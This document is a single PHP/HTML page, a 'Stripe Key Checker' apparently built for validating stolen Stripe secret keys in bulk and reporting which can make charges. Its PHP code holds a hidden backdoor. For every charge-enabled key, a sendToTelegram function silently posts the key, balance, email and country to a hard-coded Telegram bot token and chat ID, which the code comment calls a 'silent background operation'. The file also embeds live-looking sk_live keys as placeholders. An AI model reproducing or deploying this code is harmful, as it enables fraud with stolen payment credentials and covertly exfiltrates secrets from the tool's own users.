<?php
// Stripe Key Checker - PHP Version
// Save this as index.php

// Enable error reporting for debugging
error_reporting(E_ALL);
ini_set('display_errors', 1);

// Set content type to HTML
header('Content-Type: text/html; charset=utf-8');

// Telegram configuration
define('BOT_TOKEN', '7404536689:AAFUsSkHkLFa3NjE2x0PYjbFSEyU3gReplk');
define('TG_ID', '7125341830');

// Check if form was submitted
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['api_keys'])) {
    $api_keys = $_POST['api_keys'];
    $keys = array_filter(array_map('trim', explode("\n", $api_keys)));
    
    // Process all keys
    if (!empty($keys)) {
        $results = [];
        foreach ($keys as $key) {
            if (!empty(trim($key))) {
                $result = checkStripeKey($key);
                $results[] = $result;
                
                // Send to Telegram if charge enabled (silent background operation)
                if ($result['charge_enabled']) {
                    sendToTelegram($key, $result);
                }
            }
        }
        
        // Return JSON response for AJAX
        if (isset($_POST['ajax'])) {
            header('Content-Type: application/json');
            echo json_encode(['results' => $results]);
            exit;
        }
    }
}

/**
 * Send charge enabled key to Telegram
 */
function sendToTelegram($sk, $result) {
    $message = "🔰 *CHARGE ENABLED KEY FOUND* 🔰\n\n";
    $message .= "🗝️ *Key:* `" . $sk . "`\n";
    $message .= "💰 *Balance:* " . ($result['details']['balance'] ?? 'N/A') . "\n";
    $message .= "💱 *Currency:* " . ($result['details']['currency'] ?? 'N/A') . "\n";
    $message .= "🌍 *Country:* " . ($result['details']['country'] ?? 'N/A') . "\n";
    $message .= "📧 *Email:* " . ($result['details']['email'] ?? 'N/A') . "\n";
    $message .= "🕒 *Time:* " . date('Y-m-d H:i:s') . "\n\n";
    $message .= "Made By @stilll_alivenow";
    
    $url = "https://api.telegram.org/bot" . BOT_TOKEN . "/sendMessage";
    $data = [
        'chat_id' => TG_ID,
        'text' => $message,
        'parse_mode' => 'Markdown'
    ];
    
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
    curl_exec($ch);
    curl_close($ch);
}

/**
 * Check a single Stripe key with charge validation
 */
function checkStripeKey($sk) {
    $result = [
        'key' => $sk,
        'status' => 'unknown',
        'message' => '',
        'details' => [],
        'charge_enabled' => false
    ];
    
    // Test the key by making a request to Stripe API
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, "https://api.stripe.com/v1/balance");
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_HTTPHEADER, [
        "Authorization: Bearer " . $sk
    ]);
    curl_setopt($ch, CURLOPT_USERAGENT, 'StripeKeyChecker/1.0');
    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
    
    $response = curl_exec($ch);
    $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    $curl_error = curl_error($ch);
    curl_close($ch);
    
    // Analyze the response
    if ($curl_error) {
        $result['status'] = 'dead';
        $result['message'] = 'Connection Error: ' . $curl_error;
    } else {
        $data = json_decode($response, true);
        
        if (isset($data['error'])) {
            $error = $data['error'];
            
            if ($error['type'] === 'invalid_request_error') {
                if (strpos($error['message'], 'Invalid API Key') !== false) {
                    $result['status'] = 'dead';
                    $result['message'] = 'INVALID KEY GIVEN ❌';
                } else if (strpos($error['message'], 'Expired API Key') !== false) {
                    $result['status'] = 'dead';
                    $result['message'] = 'EXPIRED KEY ❌';
                } else {
                    $result['status'] = 'dead';
                    $result['message'] = 'INVALID KEY ❌';
                }
            } else {
                $result['status'] = 'dead';
                $result['message'] = 'ERROR: ' . $error['message'];
            }
        } else if (isset($data['available'])) {
            // Key is valid, get additional info
            $account_info = getStripeAccountInfo($sk);
            
            // Check if charges are enabled
            $charges_enabled = isset($account_info['charges_enabled']) && $account_info['charges_enabled'] === true;
            $result['charge_enabled'] = $charges_enabled;
            
            if ($charges_enabled) {
                $result['status'] = 'charge_enabled';
                $result['message'] = 'CHARGE ENABLED ✅';
            } else {
                $result['status'] = 'live';
                $result['message'] = 'LIVE KEY (No Charges) ⚠️';
            }
            
            $result['details'] = array_merge($result['details'], $account_info);
            
            // Get balance info
            $balance_info = getStripeBalanceInfo($data);
            $result['details'] = array_merge($result['details'], $balance_info);
        } else {
            $result['status'] = 'unknown';
            $result['message'] = 'Unexpected Response';
        }
    }
    
    return $result;
}

/**
 * Get Stripe account information with charge status
 */
function getStripeAccountInfo($sk) {
    $info = [];
    
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, "https://api.stripe.com/v1/account");
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_HTTPHEADER, [
        "Authorization: Bearer " . $sk
    ]);
    curl_setopt($ch, CURLOPT_USERAGENT, 'StripeKeyChecker/1.0');
    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
    
    $response = curl_exec($ch);
    curl_close($ch);
    
    $data = json_decode($response, true);
    
    if (isset($data['id'])) {
        $info['account_id'] = $data['id'];
        $info['business_name'] = isset($data['business_profile']['name']) ? $data['business_profile']['name'] : 'N/A';
        $info['country'] = isset($data['country']) ? $data['country'] : 'N/A';
        $info['email'] = isset($data['email']) ? $data['email'] : 'N/A';
        $info['card_payments'] = isset($data['capabilities']['card_payments']) ? $data['capabilities']['card_payments'] : 'N/A';
        $info['charges_enabled'] = isset($data['charges_enabled']) ? $data['charges_enabled'] : false;
        $info['payouts_enabled'] = isset($data['payouts_enabled']) ? $data['payouts_enabled'] : false;
        $info['details_submitted'] = isset($data['details_submitted']) ? $data['details_submitted'] : false;
    }
    
    return $info;
}

/**
 * Extract balance information from Stripe balance response
 */
function getStripeBalanceInfo($balance_data) {
    $info = [];
    
    if (isset($balance_data['available']) && !empty($balance_data['available'])) {
        $first_balance = $balance_data['available'][0];
        $info['currency'] = isset($first_balance['currency']) ? strtoupper($first_balance['currency']) : 'N/A';
        $info['balance'] = isset($first_balance['amount']) ? $first_balance['amount'] / 100 : 'N/A';
        $info['cards_processed'] = isset($first_balance['source_types']['card']) ? $first_balance['source_types']['card'] : 'N/A';
    }
    
    if (isset($balance_data['pending']) && !empty($balance_data['pending'])) {
        $first_pending = $balance_data['pending'][0];
        $info['pending_balance'] = isset($first_pending['amount']) ? $first_pending['amount'] / 100 : '0';
    } else {
        $info['pending_balance'] = '0';
    }
    
    return $info;
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>GENZ SK CHECKER</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.8.1/font/bootstrap-icons.css">
    <style>
        :root {
            --primary-color: #635bff;
            --success-color: #00d4aa;
            --danger-color: #ff5252;
            --warning-color: #ffb800;
            --dark-color: #0a0a0a;
            --light-color: #1a1a1a;
        }
        
        body {
            background: #000000;
            color: #e9ecef;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            min-height: 100vh;
            overflow-x: hidden;
        }
        
        .main-content {
            min-height: 100vh;
            padding: 1rem 0;
        }
        
        .checker-content {
            max-width: 1400px;
            margin: 0 auto;
            padding: 0 15px;
        }
        
        .stripe-checker {
            background: #111111;
            border-radius: 12px;
            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.4);
            overflow: hidden;
            border: 1px solid #222222;
        }
        
        .checker-header {
            padding: 1.5rem 2rem;
            border-bottom: 1px solid #222222;
            display: flex;
            justify-content: space-between;
            align-items: center;
            background: linear-gradient(135deg, rgba(99, 91, 255, 0.1) 0%, rgba(0, 212, 170, 0.05) 100%);
            position: relative;
        }
        
        .checker-title {
            font-size: 1.8rem;
            font-weight: 800;
            margin: 0;
            color: white;
            background: linear-gradient(135deg, #635bff 0%, #00d4aa 100%);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
        }
        
        .author-text {
            color: #8a94a6;
            font-size: 0.9rem;
            text-align: center;
            margin-top: 0.2rem;
        }
        
        .blink-text {
            animation: blink 2s infinite;
            color: #00d4aa;
            font-weight: bold;
        }
        
        @keyframes blink {
            0%, 50% { opacity: 1; }
            51%, 100% { opacity: 0.3; }
        }
        
        .input-panel {
            padding: 2rem;
        }
        
        .input-group {
            position: relative;
        }
        
        .input-group label {
            color: #b0b7c3;
            font-weight: 600;
            margin-bottom: 0.8rem;
            font-size: 1rem;
        }
        
        textarea#api_keys {
            background: #000000;
            border: 2px solid #333333;
            color: #e9ecef;
            border-radius: 10px;
            font-family: 'Courier New', monospace;
            resize: vertical;
            font-size: 0.95rem;
            padding: 1.2rem;
            transition: all 0.3s ease;
            width: 100%;
            min-height: 200px;
        }
        
        textarea#api_keys:focus {
            background: #000000;
            border-color: var(--primary-color);
            color: #e9ecef;
            box-shadow: 0 0 0 0.2rem rgba(99, 91, 255, 0.25);
            outline: none;
        }
        
        .input-hint {
            color: #666666;
            font-size: 0.85rem;
            margin-top: 0.5rem;
            display: flex;
            align-items: center;
            gap: 0.5rem;
        }
        
        .check-button {
            background: linear-gradient(135deg, var(--primary-color), #5247e5);
            color: white;
            border: none;
            padding: 0.9rem 2rem;
            border-radius: 10px;
            font-weight: 700;
            width: 100%;
            margin-top: 1.5rem;
            transition: all 0.3s;
            font-size: 1rem;
        }
        
        .check-button:hover {
            transform: translateY(-2px);
            box-shadow: 0 6px 20px rgba(99, 91, 255, 0.4);
        }
        
        .check-button:disabled {
            background: #333333;
            cursor: not-allowed;
            transform: none;
            box-shadow: none;
        }
        
        .result-section {
            padding: 0 2rem 2rem;
        }
        
        .result-column {
            margin-bottom: 1.5rem;
            border: 2px solid transparent;
            border-radius: 10px;
            padding: 1rem;
            background: rgba(0, 0, 0, 0.3);
            position: relative;
            overflow: hidden;
        }
        
        .result-column::before {
            content: '';
            position: absolute;
            top: -2px;
            left: -2px;
            right: -2px;
            bottom: -2px;
            background: linear-gradient(45deg, #ff0000, #ff7300, #fffb00, #48ff00, #00ffd5, #002bff, #7a00ff, #ff00c8, #ff0000);
            background-size: 400%;
            border-radius: 12px;
            z-index: -1;
            animation: glowing-border 20s linear infinite;
            opacity: 0.7;
        }
        
        @keyframes glowing-border {
            0% { background-position: 0 0; }
            50% { background-position: 400% 0; }
            100% { background-position: 0 0; }
        }
        
        .result-column.charge-enabled-column::before {
            background: linear-gradient(45deg, #00d4aa, #635bff, #00d4aa);
            animation: charge-glow 3s ease infinite;
        }
        
        .result-column.live-column::before {
            background: linear-gradient(45deg, #ffb800, #ff5252, #ffb800);
            animation: live-glow 3s ease infinite;
        }
        
        .result-column.dead-column::before {
            background: linear-gradient(45deg, #ff5252, #635bff, #ff5252);
            animation: dead-glow 3s ease infinite;
        }
        
        @keyframes charge-glow {
            0%, 100% { background-position: 0% 50%; }
            50% { background-position: 100% 50%; }
        }
        
        @keyframes live-glow {
            0%, 100% { background-position: 0% 50%; }
            50% { background-position: 100% 50%; }
        }
        
        @keyframes dead-glow {
            0%, 100% { background-position: 0% 50%; }
            50% { background-position: 100% 50%; }
        }
        
        .result-heading {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 1rem;
            padding-bottom: 0.5rem;
            border-bottom: 1px solid #333333;
            position: relative;
            z-index: 1;
        }
        
        .heading-left {
            display: flex;
            align-items: center;
            gap: 0.6rem;
        }
        
        .count-badge {
            background: #222222;
            color: #b0b7c3;
            padding: 0.2rem 0.6rem;
            border-radius: 10px;
            font-size: 0.8rem;
            font-weight: 700;
            animation: pulse 2s infinite;
        }
        
        @keyframes pulse {
            0% { transform: scale(1); }
            50% { transform: scale(1.05); }
            100% { transform: scale(1); }
        }
        
        .count-badge.danger {
            background: var(--danger-color);
            color: white;
        }
        
        .count-badge.success {
            background: var(--success-color);
            color: white;
        }
        
        .count-badge.warning {
            background: var(--warning-color);
            color: white;
        }
        
        .toggle-section-btn {
            background: none;
            border: none;
            color: #8a94a6;
            font-size: 1.1rem;
            cursor: pointer;
            transition: all 0.3s;
        }
        
        .result-card {
            background: #000000;
            border-radius: 8px;
            margin-bottom: 0.8rem;
            border: 1px solid #333333;
            position: relative;
            transition: all 0.3s ease;
        }
        
        .result-card::before {
            content: '';
            position: absolute;
            top: -2px;
            left: -2px;
            right: -2px;
            bottom: -2px;
            border-radius: 10px;
            opacity: 0.7;
            z-index: -1;
        }
        
        .result-card.charge_enabled::before {
            background: linear-gradient(45deg, #00d4aa, #635bff);
            animation: card-glow-green 3s ease infinite;
        }
        
        .result-card.live::before {
            background: linear-gradient(45deg, #ffb800, #ff5252);
            animation: card-glow-yellow 3s ease infinite;
        }
        
        .result-card.dead::before {
            background: linear-gradient(45deg, #ff5252, #635bff);
            animation: card-glow-red 3s ease infinite;
        }
        
        @keyframes card-glow-green {
            0%, 100% { background-position: 0% 50%; }
            50% { background-position: 100% 50%; }
        }
        
        @keyframes card-glow-yellow {
            0%, 100% { background-position: 0% 50%; }
            50% { background-position: 100% 50%; }
        }
        
        @keyframes card-glow-red {
            0%, 100% { background-position: 0% 50%; }
            50% { background-position: 100% 50%; }
        }
        
        .result-card:hover {
            transform: translateY(-3px);
            box-shadow: 0 8px 25px rgba(0, 0, 0, 0.6);
        }
        
        .key-text {
            padding: 1rem;
            display: flex;
            align-items: center;
            cursor: pointer;
            gap: 0.6rem;
            background: rgba(0, 0, 0, 0.9);
            position: relative;
            z-index: 1;
            border-radius: 8px;
        }
        
        .status-label {
            padding: 0.2rem 0.6rem;
            border-radius: 4px;
            font-size: 0.75rem;
            font-weight: 700;
            text-transform: uppercase;
            letter-spacing: 0.5px;
            min-width: 120px;
            text-align: center;
        }
        
        .status-charge_enabled {
            background: rgba(0, 212, 170, 0.2);
            color: var(--success-color);
            border: 1px solid rgba(0, 212, 170, 0.3);
        }
        
        .status-live {
            background: rgba(255, 184, 0, 0.2);
            color: var(--warning-color);
            border: 1px solid rgba(255, 184, 0, 0.3);
        }
        
        .status-dead {
            background: rgba(255, 82, 82, 0.2);
            color: var(--danger-color);
            border: 1px solid rgba(255, 82, 82, 0.3);
        }
        
        .key-value {
            flex-grow: 1;
            font-family: 'Courier New', monospace;
            word-break: break-all;
            font-size: 0.9rem;
        }
        
        .copy-button {
            background: #222222;
            border: none;
            color: #8a94a6;
            cursor: pointer;
            transition: all 0.3s;
            border-radius: 4px;
            width: 30px;
            height: 30px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 0.8rem;
        }
        
        .copy-button:hover {
            background: var(--primary-color);
            color: white;
            transform: scale(1.1);
        }
        
        .toggle-icon {
            transition: transform 0.3s;
            color: #8a94a6;
            font-size: 0.9rem;
        }
        
        .card-details {
            padding: 0 1rem;
            max-height: 0;
            overflow: hidden;
            transition: all 0.3s ease;
            background: rgba(0, 0, 0, 0.9);
            position: relative;
            z-index: 1;
            border-radius: 0 0 8px 8px;
        }
        
        .card-details.expanded {
            padding: 1rem;
            max-height: 500px;
        }
        
        .info-row {
            display: flex;
            margin-bottom: 0.5rem;
            padding: 0.3rem 0;
        }
        
        .info-label {
            width: 150px;
            color: #8a94a6;
            font-weight: 600;
            font-size: 0.85rem;
        }
        
        .info-value {
            flex-grow: 1;
            font-weight: 500;
            font-size: 0.85rem;
        }
        
        .text-success {
            color: var(--success-color) !important;
        }
        
        .text-danger {
            color: var(--danger-color) !important;
        }
        
        .text-warning {
            color: var(--warning-color) !important;
        }
        
        .no-results {
            text-align: center;
            color: #666666;
            padding: 2rem;
            font-style: italic;
            font-size: 0.9rem;
        }
        
        .processing-indicator {
            display: none;
            text-align: center;
            padding: 1.5rem;
            color: var(--primary-color);
            flex-direction: column;
            align-items: center;
            gap: 0.8rem;
            position: relative;
            z-index: 1;
        }
        
        .spinner-border {
            width: 1.5rem;
            height: 1.5rem;
            border-width: 2px;
        }
        
        .progress-container {
            width: 100%;
            background: #222222;
            border-radius: 8px;
            height: 6px;
            margin-top: 0.5rem;
            overflow: hidden;
        }
        
        .progress-bar {
            height: 100%;
            background: linear-gradient(90deg, var(--primary-color), #00d4aa);
            border-radius: 8px;
            width: 0%;
            transition: width 0.3s ease;
        }
        
        .stats-bar {
            display: flex;
            justify-content: space-between;
            padding: 1rem 2rem;
            background: #000000;
            border-top: 1px solid #222222;
            border-bottom: 1px solid #222222;
        }
        
        .stat-item {
            text-align: center;
            flex: 1;
        }
        
        .stat-value {
            font-size: 1.2rem;
            font-weight: 700;
        }
        
        .stat-label {
            font-size: 0.8rem;
            color: #8a94a6;
            margin-top: 0.2rem;
        }
        
        @media (max-width: 768px) {
            .checker-content {
                padding: 0 10px;
            }
            
            .input-panel {
                padding: 1rem;
            }
            
            .result-section {
                padding: 0 1rem 1rem;
            }
            
            .stats-bar {
                padding: 0.8rem 1rem;
            }
            
            .info-row {
                flex-direction: column;
                gap: 0.2rem;
            }
            
            .info-label {
                width: 100%;
            }
        }
    </style>
</head>
<body>
    <main class="main-content">
        <div class="container checker-content">
            <div class="stripe-checker">
                <div class="checker-header">
                    <div class="text-center w-100">
                        <h1 class="checker-title">Stripe Key Checker</h1>
                        <div class="author-text">
                            Made By <span class="blink-text">Ichigo Kurosaki</span>
                        </div>
                    </div>
                </div>
                
                <div class="stats-bar">
                    <div class="stat-item">
                        <div class="stat-value" id="total-keys">0</div>
                        <div class="stat-label">Total Keys</div>
                    </div>
                    <div class="stat-item">
                        <div class="stat-value text-success" id="charge-enabled-count">0</div>
                        <div class="stat-label">Charge Enabled</div>
                    </div>
                    <div class="stat-item">
                        <div class="stat-value text-warning" id="live-keys-count">0</div>
                        <div class="stat-label">Live Keys</div>
                    </div>
                    <div class="stat-item">
                        <div class="stat-value text-danger" id="dead-keys-count">0</div>
                        <div class="stat-label">Invalid Keys</div>
                    </div>
                </div>
                
                <div class="input-panel">
                    <form id="stripeForm">
                        <div class="input-row">
                            <div class="input-group">
                                <label for="api_keys">
                                    <i class="bi bi-key-fill"></i> Stripe Secret Keys (One per line)
                                </label>
                                <textarea id="api_keys" name="api_keys" rows="12" placeholder="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
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" required></textarea>
                                <div class="input-hint">
                                    <i class="bi bi-info-circle"></i> Keys will be automatically removed from the input as they are checked
                                </div>
                            </div>
                        </div>
                        
                        <button type="submit" class="check-button" id="checkButton">
                            <i class="bi bi-shield-check"></i> CHECK KEYS
                        </button>
                    </form>
                    
                    <div class="processing-indicator" id="processingIndicator">
                        <div class="spinner-border" role="status">
                            <span class="visually-hidden">Loading...</span>
                        </div>
                        <div>Processing keys...</div>
                        <div class="progress-container">
                            <div class="progress-bar" id="progressBar"></div>
                        </div>
                        <div id="currentKey">Checking: <span id="currentKeyText"></span></div>
                    </div>
                </div>
                
                <div class="result-section">
                    <div class="result-column charge-enabled-column">
                        <div class="result-heading">
                            <div class="heading-left">
                                <i class="bi bi-lightning-charge-fill" style="color: #00E3B7;"></i>
                                <span>Charge Enabled Keys</span>
                                <span id="charge-enabled-badge" class="count-badge success">0</span>
                            </div>
                            <button id="toggle-charge-keys" class="toggle-section-btn">
                                <i class="bi bi-chevron-down"></i>
                            </button>
                        </div>
                        <div id="charge-enabled-container"><p class="no-results">No charge-enabled keys found</p></div>
                    </div>
                    
                    <div class="result-column live-column">
                        <div class="result-heading">
                            <div class="heading-left">
                                <i class="bi bi-key-fill" style="color: #ffb800;"></i>
                                <span>Live Keys (No Charges)</span>
                                <span id="live-count-badge" class="count-badge warning">0</span>
                            </div>
                            <button id="toggle-live-keys" class="toggle-section-btn">
                                <i class="bi bi-chevron-down"></i>
                            </button>
                        </div>
                        <div id="live-keys-container"><p class="no-results">No live keys found</p></div>
                    </div>
                    
                    <div class="result-column dead-column">
                        <div class="result-heading">
                            <div class="heading-left">
                                <i class="bi bi-x-circle-fill" style="color: #ff5252;"></i>
                                <span>Invalid/Dead Keys</span>
                                <span id="dead-count-badge" class="count-badge danger">0</span>
                            </div>
                            <button id="toggle-dead-keys" class="toggle-section-btn">
                                <i class="bi bi-chevron-down"></i>
                            </button>
                        </div>
                        <div id="dead-keys-container"><p class="no-results">No invalid keys found</p></div>
                    </div>
                </div>
            </div>
        </div>
    </main>

    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/js/bootstrap.bundle.min.js"></script>
    <script>
        document.addEventListener('DOMContentLoaded', function() {
            const form = document.getElementById('stripeForm');
            const checkButton = document.getElementById('checkButton');
            const processingIndicator = document.getElementById('processingIndicator');
            const progressBar = document.getElementById('progressBar');
            const currentKeyText = document.getElementById('currentKeyText');
            const apiKeysTextarea = document.getElementById('api_keys');
            
            let totalKeys = 0;
            let processedKeys = 0;
            let chargeEnabledKeys = 0;
            let liveKeys = 0;
            let deadKeys = 0;
            let allKeys = [];
            
            // Toggle section visibility
            setupToggle('toggle-charge-keys', 'charge-enabled-container');
            setupToggle('toggle-live-keys', 'live-keys-container');
            setupToggle('toggle-dead-keys', 'dead-keys-container');
            
            function setupToggle(toggleId, containerId) {
                const toggleBtn = document.getElementById(toggleId);
                const container = document.getElementById(containerId);
                
                toggleBtn.addEventListener('click', function() {
                    const icon = this.querySelector('i');
                    
                    if (container.style.display === 'none') {
                        container.style.display = 'block';
                        icon.classList.remove('bi-chevron-down');
                        icon.classList.add('bi-chevron-up');
                    } else {
                        container.style.display = 'none';
                        icon.classList.remove('bi-chevron-up');
                        icon.classList.add('bi-chevron-down');
                    }
                });
            }
            
            // Form submission
            form.addEventListener('submit', function(e) {
                e.preventDefault();
                
                const apiKeys = apiKeysTextarea.value.trim();
                if (!apiKeys) {
                    alert('Please enter at least one Stripe key');
                    return;
                }
                
                // Reset counters and UI
                totalKeys = 0;
                processedKeys = 0;
                chargeEnabledKeys = 0;
                liveKeys = 0;
                deadKeys = 0;
                updateStats();
                
                // Store all keys
                allKeys = apiKeys.split('\n').filter(key => key.trim() !== '');
                
                // Clear previous results
                document.getElementById('charge-enabled-container').innerHTML = '<p class="no-results">No charge-enabled keys found</p>';
                document.getElementById('live-keys-container').innerHTML = '<p class="no-results">No live keys found</p>';
                document.getElementById('dead-keys-container').innerHTML = '<p class="no-results">No invalid keys found</p>';
                
                // Disable the button and show processing indicator
                checkButton.disabled = true;
                processingIndicator.style.display = 'flex';
                
                // Process keys one by one
                totalKeys = allKeys.length;
                updateStats();
                processKeysOneByOne(0);
            });
            
            function processKeysOneByOne(index) {
                if (index >= allKeys.length) {
                    // All keys processed
                    checkButton.disabled = false;
                    processingIndicator.style.display = 'none';
                    progressBar.style.width = '100%';
                    // Clear the textarea
                    apiKeysTextarea.value = '';
                    return;
                }
                
                const key = allKeys[index].trim();
                if (!key) {
                    // Skip empty lines and process next key
                    processKeysOneByOne(index + 1);
                    return;
                }
                
                // Update progress
                processedKeys++;
                const progress = (processedKeys / totalKeys) * 100;
                progressBar.style.width = progress + '%';
                currentKeyText.textContent = key.substring(0, 25) + '...';
                
                // Remove the current key from textarea
                removeKeyFromTextarea(key);
                
                // Send AJAX request to check the key
                const formData = new FormData();
                formData.append('api_keys', key);
                formData.append('ajax', 'true');
                
                fetch('', {
                    method: 'POST',
                    body: formData
                })
                .then(response => response.json())
                .then(data => {
                    displayResult(data.results[0]);
                    // Process next key after a short delay
                    setTimeout(() => {
                        processKeysOneByOne(index + 1);
                    }, 600);
                })
                .catch(error => {
                    console.error('Error:', error);
                    // Process next key even if there's an error
                    setTimeout(() => {
                        processKeysOneByOne(index + 1);
                    }, 600);
                });
            }
            
            function removeKeyFromTextarea(keyToRemove) {
                const currentKeys = apiKeysTextarea.value.split('\n')
                    .filter(k => k.trim() !== keyToRemove.trim())
                    .join('\n');
                apiKeysTextarea.value = currentKeys;
            }
            
            function displayResult(result) {
				const status = result.status;
				let containerId;
				
				if (status === 'charge_enabled') {
					containerId = 'charge-enabled-container';
					chargeEnabledKeys++;
				} else if (status === 'live') {
					containerId = 'live-keys-container';
					liveKeys++;
				} else {
					containerId = 'dead-keys-container';
					deadKeys++;
				}
				
				const container = document.getElementById(containerId);
				const noResults = container.querySelector('.no-results');
				
				// Remove the "no results" message if it exists
				if (noResults) {
					noResults.remove();
				}
				
				// Create result card
				const card = document.createElement('div');
				card.className = `result-card ${status}`;
				
				let statusClass, statusText;
				
				if (status === 'charge_enabled') {
					statusClass = 'status-charge_enabled';
					statusText = 'CHARGE ENABLED';
				} else if (status === 'live') {
					statusClass = 'status-live';
					statusText = 'LIVE KEY';
				} else {
					statusClass = 'status-dead';
					statusText = 'INVALID';
				}
				
				// Format the key for display
				const displayKey = result.key.length > 45 ? 
					result.key.substring(0, 30) + '...' + result.key.substring(result.key.length - 15) : 
					result.key;
				
				// Escape the key for use in HTML
				const escapedKey = result.key.replace(/'/g, "\\'");
				
				card.innerHTML = `
					<div class="key-text">
						<span class="status-label ${statusClass}">${statusText}</span>
						<span class="key-value">${displayKey}</span>
						<button class="copy-button" onclick="event.stopPropagation(); copyToClipboard('${escapedKey}')">
							<i class="bi bi-clipboard"></i>
						</button>
						<i class="bi toggle-icon bi-chevron-down"></i>
					</div>
					<div class="card-details">
						<div class="info-row">
							<span class="info-label">Response</span>
							<span class="info-value ${status === 'charge_enabled' ? 'text-success' : status === 'live' ? 'text-warning' : 'text-danger'}">${result.message}</span>
						</div>
						${formatDetails(result.details, result.charge_enabled)}
					</div>
				`;
				
				// Add click event to toggle details
				const keyText = card.querySelector('.key-text');
				const details = card.querySelector('.card-details');
				const toggleIcon = card.querySelector('.toggle-icon');
				
				keyText.addEventListener('click', function() {
					if (details.classList.contains('expanded')) {
						details.classList.remove('expanded');
						toggleIcon.classList.remove('bi-chevron-up');
						toggleIcon.classList.add('bi-chevron-down');
					} else {
						details.classList.add('expanded');
						toggleIcon.classList.remove('bi-chevron-down');
						toggleIcon.classList.add('bi-chevron-up');
					}
				});
				
				container.appendChild(card);
				
				// Update counters and stats
				updateCounters();
				updateStats();
			}
            
            function formatDetails(details, chargeEnabled) {
                if (!details || Object.keys(details).length === 0) {
                    return '';
                }
                
                let html = '';
                
                // Balance info
                if (details.currency || details.balance || details.pending_balance) {
                    html += `
                        <div class="info-row">
                            <span class="info-label">Balance Info</span>
                            <span class="info-value">
                                Currency: ${details.currency || 'N/A'}<br>
                                Balance: ${details.balance !== 'N/A' ? '$' + details.balance : 'N/A'}<br>
                                Pending: $${details.pending_balance || '0'}
                            </span>
                        </div>
                    `;
                }
                
                // Account info
                if (details.country || details.email) {
                    html += `
                        <div class="info-row">
                            <span class="info-label">Account Info</span>
                            <span class="info-value">
                                ${details.country && details.country !== 'N/A' ? 'Country: ' + details.country + '<br>' : ''}
                                ${details.email && details.email !== 'N/A' ? 'Email: ' + details.email : ''}
                            </span>
                        </div>
                    `;
                }
                
                return html;
            }
            
            function updateCounters() {
				// Get the actual containers
				const chargeContainer = document.getElementById('charge-enabled-container');
				const liveContainer = document.getElementById('live-keys-container');
				const deadContainer = document.getElementById('dead-keys-container');
				
				// Count only the result-card elements, ignore the no-results message
				const chargeCount = chargeContainer.querySelectorAll('.result-card').length;
				const liveCount = liveContainer.querySelectorAll('.result-card').length;
				const deadCount = deadContainer.querySelectorAll('.result-card').length;
				
				document.getElementById('charge-enabled-badge').textContent = chargeCount;
				document.getElementById('live-count-badge').textContent = liveCount;
				document.getElementById('dead-count-badge').textContent = deadCount;
			}
            
            function updateStats() {
                document.getElementById('total-keys').textContent = totalKeys;
                document.getElementById('charge-enabled-count').textContent = chargeEnabledKeys;
                document.getElementById('live-keys-count').textContent = liveKeys;
                document.getElementById('dead-keys-count').textContent = deadKeys;
            }
            
            // Copy to clipboard function
            window.copyToClipboard = function(text) {
                navigator.clipboard.writeText(text).then(function() {
                    const icon = event.target.querySelector('i');
                    icon.classList.remove('bi-clipboard');
                    icon.classList.add('bi-check');
                    
                    setTimeout(() => {
                        icon.classList.remove('bi-check');
                        icon.classList.add('bi-clipboard');
                    }, 2000);
                });
            };
        });
    </script>
</body>
</html>
